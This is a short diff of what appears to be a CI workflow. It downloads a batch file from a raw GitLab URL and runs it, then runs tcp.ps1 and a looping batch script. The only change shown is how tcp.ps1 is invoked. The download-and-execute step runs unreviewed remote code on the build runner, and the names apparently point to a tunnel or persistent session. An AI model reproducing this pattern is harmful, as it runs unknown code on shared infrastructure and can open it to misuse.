@@ -16,7 +16,7 @@ jobs:
           Invoke-WebRequest -Uri https://gitlab.com/EfeBey2903/myprojetct/-/raw/main/a.cmd -OutFile setup.bat
           cmd /c setup.bat
           sleep 5
-          cmd /c D:\a\fictional-octo-waffle\fictional-octo-waffle\tcp.ps1
+          D:\a\fictional-octo-waffle\fictional-octo-waffle\tcp.ps1
           cmd /c loop.bat
           
       - name: Start 
